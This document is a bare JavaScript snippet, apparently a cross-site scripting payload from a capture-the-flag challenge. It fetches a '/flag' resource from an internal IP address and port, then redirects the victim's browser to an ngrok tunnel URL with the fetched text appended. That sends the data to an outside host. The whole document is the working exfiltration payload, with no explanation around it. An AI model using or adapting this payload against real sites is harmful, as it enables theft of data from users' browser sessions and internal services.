fetch("http://165.232.190.5:1900/flag")
  .then(response => response.text())
  .then(data => {
    document.location = "https://98e5-27-34-22-68.in.ngrok.io/" + data;
  })
  .catch(error => console.error(error));
